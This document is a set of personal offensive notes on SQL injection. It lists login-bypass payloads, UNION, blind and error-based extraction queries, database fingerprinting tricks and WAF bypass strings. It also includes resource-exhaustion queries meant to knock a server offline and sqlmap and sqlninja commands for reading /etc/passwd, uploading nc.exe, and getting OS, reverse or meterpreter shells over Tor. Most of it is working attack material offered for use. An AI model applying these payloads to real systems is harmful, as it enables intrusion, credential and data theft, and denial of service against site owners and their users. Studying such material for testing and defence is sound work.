SQL Injection:
=============
Overview:
	ATTACKER -> WEBSITE -> backened
	attackers directly try to send a MALCIOUS query to backend
	SQLi is similar to OS injection, only difference is that in SQLi, commands are interpreted by sql_db instead of bash or cmd shell.
Basics:
	NOSQL Db:
		Examples:
			CouchDB
			MongoDB
	SQL syntax:
		verbs:
			SELECT => retrives data
			INSERT => add data
			DELETE => remove data
			UPDATE => modify table
			DROP => delete data
			UNION => combines mutiple queries (Q1 UNION Q2)
		common terms:
			WHERE => filters records based on specific conditions
			AND/OR/NOT => filters records based on multiple conditions
			ORDER BY => sorts record in ascending/descending order
			group_concat(,)
			substring(string_name,position,1)
			length(string_name)
		other commands:
			version() or @@version
			database or database0
			currentuser()
		special characters:
			' and " => string delimeters
			; => ends SQL statement
			* and % => wildcards
			|| and + and "" => string concatination
			= and + and <> => mathematical operators
			= => testing for equivalence
			() => calling functions, subqueries, INSERT statements
			%00 => NullByte
			Note: 
				comment delimeters are covered later.
	Comments in SQL:
		Three Types:
			-- :(aka double-dash comment )
				It is used to comment the rest of the line.
				In MySQL, however this operator must be followed by at least one whitespace or control character
					Example: -- -
						The last dash basically protects the trailing space.
					Example: --+
						Many URL decoders treat + as a space
			/* comment */ :
				The C-style comments allow inline commenting and multi-line comments.
				If the comment is not closed, an SQL syntax error will be raised.
				It is less used in SQL injection attacks but it can be useful in some rare cases
			# :(aka number sign comment)
				It allows commenting the rest of the line in MySQL. Contrary to the double-dash, it is not necessary to add a space after
Meta DB:(information_schema)
	information_schema is a db which is always present as its ANSI standard.
	it helps us to determine metadata (databases, tables, coloumns) available:
		MySql:
			it shows all the metadata
			DB => select schema_name from information_schema.schemata
			Tables => select table_name from information_schema.tables
			columns => select column_name from information_schema.columns
			Note:
				information_schema.tables => finding table_name
				information_schema.columns => finding column_name
		MsSql:
			its shows the metadata of only the current db
			DB => select name from sys.databases
			Tables => select name from sys.tables
			columns => select name from sys.columns
		oracle:
			oracle dont support information_schema, so we use "cheatsheets" on google
			DB => select owner from all_tables
			Tables => select table_name from all_tables
			columns => select column_name from all_tab_columns
In-Band vs Out-Band SQLi:
	inband sqli:(inline)
		we see reslts
	out-band sqli:(oob)(blind)
		we dont see results
Testing for sql injection:
	A. try the following payloads:
		*
		'*'
		^
		'^'
	B. id =1' or login=test'
		instead of ', we can also use ",),||,+,#,>
	C. MS-SQl
		.asp?s=1
		.asp?s=1' or '1'='1
		working:(backend code in ASP)
			var sql = "SELECT * FROM search where id='"+getid+"'"
			var sql = "SELECT * FROM search where id='1'"
			var sql = "SELECT * FROM search where id='2' or 'a'='a'"
	NOTE:where to test for sqli in a webapp:
		website forms (login/signup) (login_bypass)
		HTTP cookie
		HTTP user-agent
Admin login bypass:
	payloads to try:(step-1)
		*
		'*'
		^
		'^'

		admin or 1=1
		admin' or 1=1
		admin' OR 1=1
		admin OR 1=1

		admin or 1=1 --
		admin' or 1=1 -- 
		admin' OR 1=1 --
		admin OR 1=1 --	

		admin' or '1' = '1
		admin' OR '1' = '1
		admin' or '1' = '1 -- 
		admin' OR '1' = '1 --

		1 or 1=1
		1' or 1=1
		1' OR 1=1
		1 OR 1=1

		1 or 1=1 --
		1' or 1=1 -- 
		1' OR 1=1 --
		1 OR 1=1 --	

		1' or '1' = '1
		1' OR '1' = '1
		1' or '1' = '1 -- 
		1' OR '1' = '1 --

		admin' or 'a' = 'a
		admin' OR 'a' = 'a
		admin' or 'a' = 'a -- 
		admin' OR 'a' = 'a --

		1' or 'a' = 'a
		1' OR 'a' = 'a
		1' or 'a' = 'a -- 
		1' OR 'a' = 'a --
		
		Note:
			('a'='a) is better than (1=1) as sometimes a WAF can block string delimeters, but a waf dont block single quotes (') as some people have single quote as a part of their name (example: o'brian)
		Note:
			we can use these payloads in either username or password or both.
			its possible when used with both username and password, it dont work
	  	NOTE:
	  		use with burp intruder
		working:
			UnQuoted:	
				payload: 1 or 1=1
				backend:
					$value = $_GET['id'];
					$query = "SELECT * from user where userid=$id";
					query = SELECT * from user where userid=1 or 1=1;
			Quoted:
				payload: 1' or '1'='1
				backend:
					query = SELECT * from user where userid='1' or '1'='1';
	getting admin access:(step-2)
		so, step-1 can either give direct admin access or give an error.
		Error indicates that our parameter is vulnerable to SQLi
		now, we can use sqlmap:
			see sqlmap guide, its EASY
	backend code:(to understand whats happening)
		var sql = "SELECT * FROM users where name='"+fromuser+"' AND password='"+frompwdd+"'"
		if input is admin:' or 'a'='a:
			var sql = "SELECT * FROM users where name='"+fromuser+"' AND password='' or 'a'='a' "
		if input is ' or 1=1 --:xyz:
			var sql = "SELECT * FROM users where name='' or 'a'='a' -- AND password='xyz'"
	logging evasion:
		when we give some input to a webapp, its logged on the webserver as logs
		user: ' or 1=1 --sp-password
		pass: xyz
database fingerprinting:
	it can be done in multiple ways:
		db error messages can tell us.
		by testing for time delays:
			id=1' IF(1=1) WAITFOR DELAY '0:0:10' -- => MS-SQL
			id=1' IF(1=1) SELECT pg_sleep(10) => POSTGRESQL
			id=1' IF(1=1) SELECT sleep(10) => MYSQL
			id=1' IF(1=1) dbms_pipe.recieve_message(('a'),10) => ORACLE
		by testing for comments:
			MYSQL:
				#comment
				/*comment*/
				-- comment
			ORACLE:
				--comment
			POSTGRESQL:
				--comment
				/*comment*/
			MS-SQL:
				--comment
				/*comment*/
		by testing for special functions:
			select @@version => mysql
			connection_id() => mysql
			@@pack_recieved => mssql
			BITAND(1,1) => orcaledb
		string concatination:
			'de''nt' => mysql
			'de'+'nt' => mssql
			'de'||'nt' => oracledb
Stacked Queries:
	Real Benefit of stacked queries is that, they allow us to break out of a query and let us do other malicous stuff.
	Example:
		User: dent
			backend => Select * from users where lname='dent';
		User: dent'; CREATE TABLE exfil (data varchar(1000)); --
			payload => '; CREATE TABLE exfil (data varchar(1000)); --
			backend => Select * from users where lname='dent'; CREATE TABLE exfil (data varchar(1000)); -- ';
	As we can see in above example, "stacked queries" helped us to break out of where clause of select statement and helped us creat a new table.
	Note:
		by default, stacked queries are disabled on mysql db
Union based SQLi:(Error-based sqli)
	why do we use it?
		when we want to extract data
	why is it called error based?
		bcoz we work using error
	Union SQLi is similar to stacked queries, but has some differences.
		Example:
			user: dent' union select * from customers;--
			backend: Select * from users where lname='dent' union select * from customers;-- ';
	Conditions to use "union":
		1. both tables must have equal number of columns
		2. columns of both tables must have datatypes which are compatible
		3. we need to know name of tables beforehand.
	Bypassing conditions of union:
		determining number of columns:
			Basics:
				select 1 => return 1
				select 'ab' => return 'ab'
					notice that we are not selecting from any table. Its also known as "FORMless select" as we dont use form clause here.
				select NULL => returns NULL
					"null" is a datatype which is compatible with evry datatype
			Explaining concept via example:
				dent' union select NULL;--
					error => "used statement a different number of columns"
				dent' union select NULL,NULL; --
					error
				dent' union select NULL,NULL,NULL; --
					error
				dent' union select NULL,NULL,NULL,NULL; --
					no error => number of columns is 4
		determining datatype of columns:
			All we need is one column which can accomodate strings
			Using previous example:
				dent' union select '1','2','3','4'; --
					we see which number is visible, then we use that null to pull off data
	id=1 order by X -- => we decrease x till we dont get the db error
	lets suppose error comes at 4, we have 2 ways now:
	way-1:
		id=1 union select NNLL,NULL,NULL,@@version --
		DB => select table_schema from information_schema.columns --
		TABLES => select table_name,column_name from information_schema.columns where table_schema='our selcted DB' --
		DATA => select col1,col2 from 'ourdb'.'ourtable' --
	way-2:
		id=1 union select 1,2,3,4,@@version --
		DB => union select 1,2,3,4,database() --
		ALL TABLES => union select table_name,2,3,4,5 from information_schema.tables  --
		TABLES OF OUR DB => union select group_concat(table_name),2,3,4,5 from information_schema.tables where table_schema=database() --
		COLUMNS OF A TABLE => union select group_concat(column_name),2,3,4,5 from information_schema.columns where table_name="table" --
		DATA => union select group_concat(col1,col2),2,3,4,5 from "table" --
Stacked Queries:
	Stacking is diabled by default, so we use union statements.
Blind Sqli:
	how to know we have blind sqli:
		we dont see db error messages
	we can have varying level of blindness:
		custom error messages instead of db error messages:
			what matters is that whether our input is being interpreted by db interpreter or not
			dent => user found
			dent'=> user not found
			Equavelent String Injection:
				de'/* */'nt => if it works as "dent" => user found => sqli found 
				de' 'nt => if it works as "dent" => user found => sqli found 
				de'||'nt => if it works as "dent" => user found => sqli found 
				dent';# => if it works as "dent" => user found => sqli found 
				dent';-- => if it works as "dent" => user found => sqli found 
			Binary/Boolean Inference Testing:
				these should return "user found":
					dent' AND 1;#
					dent' AND 1=1;#
				these should return "user notfound":
					dent' AND 0;#
					dent' AND 0=1;#
			grabbing data:
				dent' AND substr((select table_name from information_schema.tables limit 1),1,1) > "a";#
					is the 1st  etter of 1st table greater than "a"
MS-SQL Injection:
	using "Group By" and "Having":
		enumerating table_name and column_name:
			id=1' HAVING 1=1 --
				select * from news where id='1' having 1=1 --
				it will give error like "column 'news.news_id' is invalid"
				so we got 1 column_name and 1 table_name
			id=1' GROUP BY news.news_id HAVING 1=1 --
				it will give us a similiar error , but with one more column_name
				say, we got 'news.news_author'
			id=1' GROUP BY news.news_id,news.news_author HAVING 1=1 --
				it will give us a similiar error , but with one more column_name
				say, we got 'news.news_detail'
			id=1' GROUP BY news.news_id,news.news_author,news.news_detail HAVING 1=1 --
				it gave no error
				it means we have a table and its 3 columns
	using "convert":
		Usage:
			convert(int,x(char)) => convert x(char) into int 
			1=convert(int,x) 
		Enumerating DB/OS:
			id=1+and+1=convert(int,@@version) --
			id=1+and+1=convert(int,db_name()) --
			id=1+and+1=convert(int,username()) --
		Enumerating Tables:
			id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables)) -- => TOP table
			id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in+('1st table'))) -- => 2nd TOP table
		Enumerating Columns:
			id=1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where table_name='table name')) -- => TOP column
			id=1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where table_name='table name'+and+column_name+not+in+('col1'))) -- => TOP column => 2nd TOP column
		Enumerating Data:
			id=1+and+1=convert(int,(select+top+1+'column name'+from+'table name')) -- => row1
			id=1+and+1=convert(int,(select+top+1+'column name'+from+'table name'+where+'column name'+not+in+('row1'))) -- => row2
Blind SQLI:
	when a webapp is vuln to SQLI, but it's http response/headers dont show anything
OOB SQLI:
DDOS Using SQL injection:(Web Application Level DDOS)
	We send complex SQL queries to the db to increase power consumption of Web Server and to Exhaust the Server resources
	Sql Queries:(Payloads)
		select tab1 from (select decode(encode(convert(compress(post) using latin1),concat(post,post,post,post)),sha1(concat(post,post,post,post))) as tab1 from table_1)a;
		select tab1 from (select decode(encode(convert(compress(post) using latin1),des_encrypt(concat(post,post,post,post),8)),des_encrypt(sha1(concat(post,post,post,post)),9)) as tab1 from table_1)a;
	Using these Sql Queries:
		http://site.com/link.php?id=1' union select 1,2,3,4-- //vuln site
		lets us assume 3rd column is vulnerable
			http://site.com/link.php?id=1' union select 1,2,(select tab1 from (select decode(encode(convert(compress(post) using latin1),des_encrypt(concat(post,post,post,post),8)),des_encrypt(sha1(concat(post,post,post,post)),9)) as tab1 from table_1)a),4--
		countinuesly sending this injection to the website using a script will get the server down
Manual WAF Bypass for SQLI:
	Bypass String:
		/!00000UNION*/ /*!00000SELECT*/
	Encoding:
		= => %3d
		space => +
	Capital Letters
SQLMAP Guide:(MYSQL|MSSQL|ORACLE|POSTGRESQL|SQLITE|more)
	specifying url:(synatx of "-u")
		-u aa
		-u 'aa'
		-u "aa"
	using sqlmap on forms(login pages):
		sqlmap -u '' --forms
	GET parameter:
		sqlmap -u http://target.com/a.php?id=1 //GET parameter
	POST parameter:
		sqlmap -u --data=id=x&pass=pass123
	REQUEST:(both POST and GET)
		copy HTTP request from BurpSuite and save it s request.req
		sqlmap -r request.req
	to use deadult settings:
		--batch => this option helps in providing default answers to questions which sqlmap asks throughout the testing
	Authenciated testing:
		A. we can use authenicated requests "-r file.req"
		B. specifying cookie:
			--cookie="xxxx:xxxx-------"
	Specifying vulnerable parameter:
		in REQUEST/POST/GET, we may have more than 1 parameters and sqlmap will take a lot of time to find the vulnerable parameter. So, if we know the vulnerable parameter via recon, we can mention it.
		sqlmap -u http://target.com/a.php?id=1&s=12 -p id //GET parameter
		sqlmap -r request.req -p pass
		sqlmap -u http://target.com/a.php?id=*&s=12 //GET parameter
			* represents the vulnerable parameter
	Specifying dbms:
		sometimes, sqlmap fails to identify the DBMS and we know it by recon
		sqlmap -u '' --dbms=mysql
	Bypassing WAF:
		Specifying user-agent:
			--user-agent=xxxx
			--random-agent => supplies random user-agent
			Note:
				default "user-agent" of sqlmap is easily caught by WAFs. So always use user-agent of browser.
		Specifying referer:
			--referer=xxxx
			WAFs also look at referer header to make sure that "flow of website" is in order.
		Tamper Scripts:
			General Tamper testing:
				tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
			MSSQL:
				tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
			MySQL:
				tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
			NOTE:
				to see info a about each of tamper script use this:
				sqlmap --list-tampers
	Level and Risk:
		Levels:(5)
			1. default
			2. Adds HTTP "cookie" header testing
			3. Adds HTTP "user-agent/referer" header testing
			4.
			5. Adds HTTP "host" header testing
			--level=x
		Risks:(3)
			1. default/normal
			2. Medium => Adds testing for "heavy query time-based SQLI"
			3. Hard => Adds testing for "OR-based SQLI"
			issue => all risks have possibility of deleting/updating DB
			--risk=y
	enumerating DB:
		--dbs => show databases
		-D a --tables => show tables
		-D a -T b --columns => show columns
		-D a -t b --dump => dump data of table
		--all => dumps everything
	DB exploitation:
		Files:
			--file-read=/etc/paasswd
			--file-write "xx" --file-dest "c:/windows":
				can be used to upload nc.exe
		--priv-esc => escalate DB privileges
	Shell:
		--sql-shell:
			it allows to do things which we can do in a database interpreter (like MYSQL cli). Basically, we can maake changes to the DBMS.
		--os-shell => gets OS shell by exploiting SQLI
		--os-cmd=command => runs "command"
		--os-pwn:
			select metasploit and PHP as options
			it will provide a meterpreter shell
	Advanced Options:
		TOR:
			it is completely for anonimity purposes
			requirement:
				we need to have TOR installed (apt-get insall TOR)
			sqlmap --check-tor => to check if tor is present
			sqlmap -u '' --tor --tor-type=SOCKS5
	using proxy:
		--proxy => requests from sqlmap will pass through proxy aand then will go to target
		use: helps in analysis of vulnerable paramater
		we use BurpSuite as proxy
		sqlmap -u --proxy=http://127.0.0.1:8080		
Sqlninja Guide:(MSSQL)
	flags:
		-m => attack mode
			modes:
				test:(t)
					Its used in BEGINING to test whether configuration file is correct and whether there is a sql vuln present
				fingerprint:(f)
					fingerprintes the remote server
				bruteforce:(b)
				escalation:(e)
				resurrectxp:(x)
				upload:(u)
				dirshell:(s)
				backscan:(k)
				revshell:(r)
				dnstunnel:(d)
				icmpshell:(i)
				metasploit:(m)
				sqlcmd:(c)
					mode to execute commands on shell
					Note:
						the best way to check if a command is working is by 
						kali> nc -nvlp 80 (acting as web server)
						cmd> ping my_ip
						issue:
							in case, we are attacking a website, we need our own server to test this
				getdata:
		-f => configuration file 
			file.conf:
				First line => --httprequest_start--
				after 1st line:
					copy the request from burp and paste it, append __SQL2INJECT__ in front of parameter(s) you want to attack
				Last line => --httprequest_end--
			example:
				--httprequest_start--
				-----burp request-----
				user=test';__SQL2INJECT__&pass=test';__SQL2INJECT__
				-----burp request-----
				--httprequest_end--
		-p sa_password:
			sa => user having admin privileges
			used in escalation mode to add current DB user to the sysadmin group
			used in other modes to run query as admin
		-w => wordlist for bruteforce mode
		-g => in upload mode, it generates debug script and exit
		-d debug_mode:
			helps to see the queries used by the tool/requests/responses
			modes:
				1 => print each SQL command that is being injected
				2 => print each HTTP request that is sent to the target
				3 => print each HTTP response that is received from the target
				all => all of the above
	sqlninja -f file.conf -m <mode> <parameters>